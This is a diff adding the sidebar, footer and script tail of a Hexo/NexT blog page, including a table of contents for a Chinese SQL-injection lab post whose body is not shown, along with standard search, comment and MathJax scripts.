+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel ">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/1.jpg"
+               alt="shawnleon" />
+          <p class="site-author-name" itemprop="name">shawnleon</p>
+          <p class="site-description motion-element" itemprop="description">People always like the person who are willing to trust them.</p>
+        </div>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="site-state-item-count">12</span>
+              <span class="site-state-item-name">日志</span>
+            </a>
+          </div>
+
+          
+
+          
+            <div class="site-state-item site-state-tags">
+              <a href="/tags">
+                <span class="site-state-item-count">11</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/shawnleon" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://twitter.com/copercheung" target="_blank" title="Twitter">
+                  
+                    <i class="fa fa-fw fa-twitter"></i>
+                  
+                  Twitter
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="http://www.weibo.com/3691383884/profile?rightmod=1&wvr=6&mod=personinfo" target="_blank" title="Weibo">
+                  
+                    <i class="fa fa-fw fa-weibo"></i>
+                  
+                  Weibo
+                </a>
+              </span>
+            
+              <span class="links-of-author-item">
+                <a href="https://www.facebook.com/profile.php?id=100009656739973" target="_blank" title="facebook">
+                  
+                    <i class="fa fa-fw fa-facebook"></i>
+                  
+                  facebook
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links/友情链接
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://shitoudaren.github.io/" title="shit欧建磊" target="_blank">shit欧建磊</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://leelie.github.io" title="伟伟leelie" target="_blank">伟伟leelie</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://lovexiaofeng.cn/" title="call me小峰" target="_blank">call me小峰</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://scorpoin.github.io" title="大棟の哥" target="_blank">大棟の哥</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://liulangdelmao.github.io/" title="卓卓" target="_blank">卓卓</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://nouername.github.io" title="帅乔飞" target="_blank">帅乔飞</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://zhmy1228.github.io" title="moon明明如月" target="_blank">moon明明如月</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+      </section>
+
+      
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+            
+              
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#sql-1-GET-Error-based-single-quotes-String-1"><span class="nav-number">1.</span> <span class="nav-text">sql-1:GET-Error based -single quotes - String(1)</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#本次测试使用本地的环境"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">本次测试使用本地的环境.</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01原理分析"><span class="nav-number">1.1.</span> <span class="nav-text">0x01原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#分析："><span class="nav-number">1.1.0.1.</span> <span class="nav-text">分析：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-注入演示"><span class="nav-number">1.2.</span> <span class="nav-text">0x02 注入演示</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#注入验证"><span class="nav-number">1.2.1.</span> <span class="nav-text">注入验证</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#union-select注入"><span class="nav-number">1.2.2.</span> <span class="nav-text">union select注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#由于环境中有显示位-我们先来使用union-select联合查询语句"><span class="nav-number">1.2.2.1.</span> <span class="nav-text">由于环境中有显示位,我们先来使用union select联合查询语句.</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#报错注入"><span class="nav-number">1.2.3.</span> <span class="nav-text">报错注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#原理分析"><span class="nav-number">1.2.3.1.</span> <span class="nav-text">原理分析</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#实例："><span class="nav-number">1.2.3.2.</span> <span class="nav-text">实例：</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03防护"><span class="nav-number">1.3.</span> <span class="nav-text">0x03防护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-总结"><span class="nav-number">1.4.</span> <span class="nav-text">0x04 总结</span></a></li></ol></li></ol></div>
+            
+          </div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">shawnleon</span>
+</div>
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Pisces
+  </a>
+</div>
+
+        
+
+<div class="busuanzi-count">
+
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv"><i class="fa fa-user"></i><span class="busuanzi-value" id="busuanzi_value_site_uv"></span></span>
+  
+
+  
+    <span class="site-pv"><i class="fa fa-eye"></i><span class="busuanzi-value" id="busuanzi_value_site_pv"></span></span>
+  
+  
+</div>
+
+
+
+        
+      </div>
+    </footer>
+
+    <div class="back-to-top">
+      <i class="fa fa-arrow-up"></i>
+    </div>
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+  
+  <script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/vendors/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.0.1"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.0.1"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.0.1"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.0.1"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.0.1"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.0.1"></script>
+
+
+
+  
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"shawnleon"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.id = 'duoshuo-script';
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+
+  
+    
+    <script src="/vendors/ua-parser-js/dist/ua-parser.min.js?v=0.7.9"></script>
+    <script src="/js/src/hook-duoshuo.js"></script>
+  
+
+
+
+
+
+
+  
+  
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+       search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body").append('<div class="popoverlay">').css('overflow', 'hidden');
+      $('.popup').toggle();
+
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+    'use strict';
+    $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+            // get the contents from search data
+            isfetched = true;
+            $('.popup').detach().appendTo('.header-inner');
+            var datas = $( "entry", xmlResponse ).map(function() {
+                return {
+                    title: $( "title", this ).text(),
+                    content: $("content",this).text(),
+                    url: $( "url" , this).text()
+                };
+            }).get();
+            var $input = document.getElementById(search_id);
+            var $resultContent = document.getElementById(content_id);
+            $input.addEventListener('input', function(){
+                var matchcounts = 0;
+                var str='<ul class=\"search-result-list\">';
+                var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                $resultContent.innerHTML = "";
+                if (this.value.trim().length > 1) {
+                // perform local searching
+                datas.forEach(function(data) {
+                    var isMatch = true;
+                    var content_index = [];
+                    var data_title = data.title.trim().toLowerCase();
+                    var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                    var data_url = data.url;
+                    var index_title = -1;
+                    var index_content = -1;
+                    var first_occur = -1;
+                    // only match artiles with not empty titles and contents
+                    if(data_title != '' && data_content != '') {
+                        keywords.forEach(function(keyword, i) {
+                            index_title = data_title.indexOf(keyword);
+                            index_content = data_content.indexOf(keyword);
+                            if( index_title < 0 && index_content < 0 ){
+                                isMatch = false;
+                            } else {
+                                if (index_content < 0) {
+                                    index_content = 0;
+                                }
+                                if (i == 0) {
+                                    first_occur = index_content;
+                                }
+                            }
+                        });
+                    }
+                    // show search results
+                    if (isMatch) {
+                        matchcounts += 1;
+                        str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                        var content = data.content.trim().replace(/<[^>]+>/g,"");
+                        if (first_occur >= 0) {
+                            // cut out 100 characters
+                            var start = first_occur - 20;
+                            var end = first_occur + 80;
+                            if(start < 0){
+                                start = 0;
+                            }
+                            if(start == 0){
+                                end = 50;
+                            }
+                            if(end > content.length){
+                                end = content.length;
+                            }
+                            var match_content = content.substring(start, end);
+                            // highlight all keywords
+                            keywords.forEach(function(keyword){
+                                var regS = new RegExp(keyword, "gi");
+                                match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                            });
+
+                            str += "<p class=\"search-result\">" + match_content +"...</p>"
+                        }
+                        str += "</li>";
+                    }
+                })};
+                str += "</ul>";
+                if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+                if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+                $resultContent.innerHTML = str;
+            });
+            proceedsearch();
+        }
+    });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".popoverlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+  
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      tex2jax: {
+        inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+        processEscapes: true,
+        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+      }
+    });
+  </script>
+
+  <script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+      var all = MathJax.Hub.getAllJax(), i;
+      for (i=0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+      }
+    });
+  </script>
+  <script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+  
+
+  
+
+</body>
+</html>
